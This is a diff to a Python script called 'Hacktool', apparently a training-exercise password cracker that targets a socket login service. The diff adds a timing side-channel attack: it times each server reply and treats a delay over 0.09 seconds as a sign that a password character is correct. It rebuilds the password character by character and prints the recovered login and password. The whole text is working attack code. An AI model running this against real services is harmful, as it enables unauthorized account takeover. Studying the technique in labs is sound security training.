@@ -3,6 +3,7 @@ import argparse
 from string import digits, ascii_lowercase
 import itertools
 import json
+import time
 
 
 class Hacktool:
@@ -71,17 +72,22 @@ class Hacktool:
             psw = ''.join(self.psw_base)
             js_data = json.dumps({"login": f"{self.login}", "password": f"{psw}"})
             self.send_data(js_data)
+            start = time.perf_counter()
             self.receive()
-            if self.recv_data['result'] == "Exception happened during login":
-                return False
-            elif self.recv_data['result'] == "Connection success!":
+            stop = time.perf_counter()
+            delta = stop - start
+            # print('Time: ', delta)
+            if self.recv_data['result'] == "Connection success!":
                 self.password = psw
                 return True
-            elif self.recv_data['result'] == "Wrong password!":
+            if delta >= 0.09:
+                return False
+            elif delta < 0.09:
                 self.psw_base.pop()
                 continue
 
 
+"""Parse command line arguments"""
 parser = argparse.ArgumentParser()
 parser.add_argument("hostname", default='localhost')
 parser.add_argument("port", default=9090)
@@ -90,14 +96,17 @@ args = parser.parse_args()
 params = [args.hostname, args.port]
 
 
-my_hacktool = Hacktool(params)
-my_hacktool.connect_to_socket()
-# words = my_hacktool.lower_upper_words()
-my_hacktool.get_fit_login()
+def main():
+    my_hacktool = Hacktool(params)
+    my_hacktool.connect_to_socket()
+    # words = my_hacktool.lower_upper_words()
+    my_hacktool.get_fit_login()
+    while True:
+        if my_hacktool.get_fit_pass():
+            break
+    print(json.dumps({"login": f"{my_hacktool.login}", "password": f"{my_hacktool.password}"}))
+    my_hacktool.close()
 
-while True:
-    if my_hacktool.get_fit_pass():
-        break
 
-print(json.dumps({"login": f"{my_hacktool.login}", "password": f"{my_hacktool.password}"}))
-my_hacktool.close()
+if __name__ == "__main__":
+    main()
